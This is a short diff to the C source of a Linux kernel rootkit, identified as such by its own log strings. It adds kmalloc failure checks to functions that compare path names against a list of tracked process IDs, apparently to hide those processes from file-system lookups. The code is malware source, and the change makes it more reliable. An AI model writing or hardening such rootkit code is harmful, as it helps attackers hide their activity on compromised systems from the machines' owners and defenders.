@@ -147,6 +147,10 @@ static char* my_basename(const char* pathname){
 
 	len = strlen(basename);
 	char* result = kmalloc(len+1, GFP_KERNEL);
+	if (result == NULL){
+		log("ROOKTIT: ERROR kmalloc(%d) in my_basename", len+1);
+		return result;
+	}
 	strncpy(result, basename, len);
 	if (result[len-1] == '/') //delete / on last character
 		result[len-1] = '\x00';
@@ -169,12 +173,17 @@ int pathname_includes_pid(const char __user* pathname){
 	}
 
 	char* my_pathname = kmalloc(len, GFP_KERNEL);
+	if (my_pathname == NULL){
+		log("ROOTKIT: ERROR kmalloc(%d) in pathname_includes_pid", len);
+		return -1;
+	}
 	strncpy_from_user(my_pathname, pathname, len);
 
 	list_for_each_entry(node, &list_pids, list){
 		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
 		snprintf(pid_str2, sizeof(pid_str2), "%d/", node->pid);
 		filename = my_basename(my_pathname);
+		if (filename == NULL) continue; // don't free it
 		if (strcmp(pid_str, filename) == 0 || strstr(my_pathname, pid_str2) != NULL){
 			ret = node->pid;
 			kfree(filename);
